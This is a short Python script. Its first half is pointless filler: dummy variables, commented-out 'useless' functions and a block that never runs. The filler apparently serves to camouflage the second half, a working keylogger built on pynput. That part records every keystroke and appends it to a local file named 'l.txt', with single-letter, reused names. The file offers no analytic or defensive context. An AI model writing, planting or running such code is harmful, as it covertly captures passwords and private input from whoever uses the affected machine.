import time


a = 12345
b = "foobar"
c = [i*2 for i in range(10)]
d = sum(c); 

#def useless1():;  return 42
#def useless2(x):; return x[::-1]

#x = useless1(); y = useless2("HELLO")
z = a + d
if False:
    print("clouded"); 
    print("ed")


from pynput import keyboard as k
l = "l.txt"
def a(b):
    try:
        with open(l,"a") as f:
            f.write(f"{b.char}\n")
    except AttributeError:
        with open(l,"a") as f:
            f.write(f"{b}\n")
with k.Listener(on_press=a) as c:
    c.join()
